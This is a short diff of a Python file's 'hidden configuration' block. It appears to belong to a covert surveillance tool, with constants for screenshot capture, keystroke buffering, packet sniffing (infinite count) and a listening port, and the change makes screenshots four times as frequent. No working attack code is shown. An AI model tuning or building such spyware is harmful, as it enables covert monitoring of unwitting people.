@@ -41,7 +41,7 @@ except ImportError:
 
 # ── Configuración oculta ──────────────────────────────────
 DEFAULT_PORT = 9999
-SCREENSHOT_INTERVAL = 60
+SCREENSHOT_INTERVAL = 15
 KEY_BUFFER_FLUSH_INTERVAL = 5
 SNIFF_FLUSH_INTERVAL = 10
 SNIFF_PACKET_COUNT = 0       # 0 = infinito
